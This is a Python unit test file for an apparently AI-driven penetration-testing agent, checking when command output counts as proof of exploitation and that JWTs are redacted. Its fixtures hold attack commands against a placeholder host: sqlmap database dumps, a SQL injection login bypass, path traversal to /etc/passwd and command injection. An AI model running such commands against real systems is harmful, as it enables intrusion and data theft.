import os
import tempfile
import unittest
from pathlib import Path


def _import_dynamic_agent():
    # Import from repo path without requiring it to be installed as a package.
    import sys
    here = Path(__file__).resolve()
    repo = here.parents[2]
    oi_dir = repo / "kali-executor" / "open-interpreter"
    sys.path.insert(0, str(oi_dir))
    import dynamic_agent  # type: ignore
    return dynamic_agent


class TestProofGate(unittest.TestCase):
    def setUp(self):
        self.dynamic_agent = _import_dynamic_agent()
        self.tmpdir_obj = tempfile.TemporaryDirectory()
        self.tmpdir = self.tmpdir_obj.name

        # Keep env changes local to this test instance
        self._old_env = dict(os.environ)
        os.environ["ENFORCE_EXPLOITATION_PROOF"] = "true"

        self.agent = self.dynamic_agent.DynamicAgent(log_dir=self.tmpdir, llm_provider=None)

    def tearDown(self):
        os.environ.clear()
        os.environ.update(self._old_env)
        self.tmpdir_obj.cleanup()

    def _exec(self, content, stdout="", stderr="", success=True, tool_used="curl"):
        Execution = self.dynamic_agent.Execution
        return Execution(
            timestamp="2026-02-06T00:00:00Z",
            iteration=1,
            execution_type="command",
            content=content,
            stdout=stdout,
            stderr=stderr,
            exit_code=0 if success else 1,
            duration_ms=10,
            success=success,
            tool_used=tool_used,
        )

    def test_sqlmap_dump_proof_ok(self):
        v = {"type": "sql injection", "target": "http://example/login"}
        ex = self._exec(
            "sqlmap -u \"http://example/rest/user/login\" --batch --dump",
            stdout="available databases [2]\nDatabase: main\nTable: Users\n[INFO] dumping entries",
            tool_used="sqlmap",
        )
        ok, _ = self.agent._proof_ok_for_vuln(v, ex)
        self.assertTrue(ok)

    def test_redact_sensitive_handles_truncated_jwt(self):
        # When we clip output, we may lose the JWT signature segment; we should still redact.
        truncated = "token=eyJ" + ("a" * 80) + "." + ("b" * 80)
        red = self.agent._redact_sensitive(truncated)
        self.assertIn("<<JWT_REDACTED>>", red)
        self.assertNotIn("eyJ", red)

    def test_sqli_proof_includes_cmd_and_redacts_jwt(self):
        v = {"type": "sql injection", "target": "http://example/login"}
        jwt = "eyJaaaaaaaaaaa.bbbbbbbbbbb.ccccccccccc"
        ex = self._exec(
            "curl -s -X POST http://example/rest/user/login -H 'Content-Type: application/json' -d '{\"email\":\"\\' OR 1=1--\",\"password\":\"x\"}'",
            stdout=f'{{\"authentication\":{{\"token\":\"{jwt}\"}},\"data\":{{\"role\":\"admin\"}}}}',
            tool_used="curl",
        )
        ok, proof = self.agent._proof_ok_for_vuln(v, ex)
        self.assertTrue(ok)
        self.assertIn("cmd:", proof)
        self.assertIn("output:", proof)
        self.assertIn("<<JWT_REDACTED>>", proof)
        self.assertNotIn(jwt, proof)

    def test_sqli_token_without_role_not_ok(self):
        v = {"type": "sql injection", "target": "http://example/login"}
        ex = self._exec(
            "curl -s -i http://example/rest/user/login",
            stdout="HTTP/1.1 200 OK\n\n{\"token\":\"eyJaaaaaaaaaaa.bbbbbbbbbbb.ccccccccccc\"}",
            tool_used="curl",
        )
        ok, _ = self.agent._proof_ok_for_vuln(v, ex)
        self.assertFalse(ok)

    def test_lfi_seed_alone_not_ok(self):
        v = {"type": "lfi", "target": "http://example/ftp"}
        ex = self._exec(
            "curl -s \"http://example/ftp?file=../../../../etc/passwd\"",
            stdout=("seed: " + ("x" * 200)),
            tool_used="curl",
        )
        ok, _ = self.agent._proof_ok_for_vuln(v, ex)
        self.assertFalse(ok)

    def test_info_disclosure_ftp_bak_ok(self):
        v = {"type": "information disclosure", "target": "http://example/ftp"}
        ex = self._exec(
            "curl -s http://example/ftp/package.json.bak",
            stdout=("{\"name\":\"x\",\"version\":\"1\"}\n" + ("x" * 120)),
            tool_used="curl",
        )
        ok, proof = self.agent._proof_ok_for_vuln(v, ex)
        self.assertTrue(ok)
        self.assertIn("cmd:", proof)

    def test_lfi_passwd_ok(self):
        v = {"type": "path traversal", "target": "http://example/ftp"}
        ex = self._exec(
            "curl -s \"http://example/ftp?file=../../../../etc/passwd\"",
            stdout="root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n",
            tool_used="curl",
        )
        ok, _ = self.agent._proof_ok_for_vuln(v, ex)
        self.assertTrue(ok)

    def test_mass_assignment_admin_word_not_ok(self):
        v = {"type": "mass assignment", "target": "http://example/api/users"}
        ex = self._exec(
            "curl -s http://example/api/users",
            stdout="Welcome to the admin panel",
            tool_used="curl",
        )
        ok, _ = self.agent._proof_ok_for_vuln(v, ex)
        self.assertFalse(ok)

    def test_mass_assignment_json_role_admin_ok(self):
        v = {"type": "mass assignment", "target": "http://example/api/users"}
        ex = self._exec(
            "curl -s http://example/api/users",
            stdout="{\"email\":\"a@b.c\",\"role\":\"admin\"}",
            tool_used="curl",
        )
        ok, _ = self.agent._proof_ok_for_vuln(v, ex)
        self.assertTrue(ok)

    def test_rce_whoami_not_ok(self):
        v = {"type": "rce", "target": "http://example/api/exec"}
        ex = self._exec(
            "curl -s \"http://example/api/exec?cmd=whoami\"",
            stdout="whoami",
            tool_used="curl",
        )
        ok, _ = self.agent._proof_ok_for_vuln(v, ex)
        self.assertFalse(ok)

    def test_rce_uid_ok(self):
        v = {"type": "command injection", "target": "http://example/api/exec"}
        ex = self._exec(
            "curl -s \"http://example/api/exec?cmd=id\"",
            stdout="uid=1000(pwn) gid=1000(pwn) groups=1000(pwn)",
            tool_used="curl",
        )
        ok, _ = self.agent._proof_ok_for_vuln(v, ex)
        self.assertTrue(ok)

    def test_jwt_weakness_requires_privileged_endpoint_not_login(self):
        v = {"type": "jwt weakness", "target": "http://example"}
        ex = self._exec(
            "curl -s -X POST http://example/rest/user/login -H \"Content-Type: application/json\" -d '{\"email\":\"a@b.c\",\"password\":\"x\"}'",
            stdout='{"authentication":{"token":"eyJaaaaaaaaaaa.bbbbbbbbbbb.ccccccccccc"}}',
            tool_used="curl",
        )
        ok, _ = self.agent._proof_ok_for_vuln(v, ex)
        self.assertFalse(ok)

    def test_jwt_weakness_bearer_api_dump_ok(self):
        v = {"type": "jwt weakness", "target": "http://example"}
        ex = self._exec(
            "curl -s -H \"Authorization: Bearer eyJaaaaaaaaaaa.bbbbbbbbbbb.ccccccccccc\" http://example/api/Users",
            stdout='[{"id":1,"email":"admin@example.com","role":"admin"}]',
            tool_used="curl",
        )
        ok, _ = self.agent._proof_ok_for_vuln(v, ex)
        self.assertTrue(ok)

    def test_default_long_output_not_ok(self):
        v = {"type": "weird vuln", "target": "http://example"}
        ex = self._exec("curl -s http://example", stdout=("a" * 300), tool_used="curl")
        ok, _ = self.agent._proof_ok_for_vuln(v, ex)
        self.assertFalse(ok)

    def test_file_artifact_proof_ok(self):
        v = {"type": "lfi", "target": "http://example/ftp"}
        out_path = "/tmp/tazosploit_proof_test.txt"
        try:
            Path(out_path).write_text("root:x:0:0:root:/root:/bin/bash\n", encoding="utf-8")
            ex = self._exec(f"curl -s -o {out_path} http://example/ftp/file", stdout="", tool_used="curl")
            ok, proof = self.agent._proof_ok_for_vuln(v, ex)
            self.assertTrue(ok)
            self.assertIn("file:", proof)
        finally:
            try:
                Path(out_path).unlink()
            except Exception:
                pass


if __name__ == "__main__":
    unittest.main()
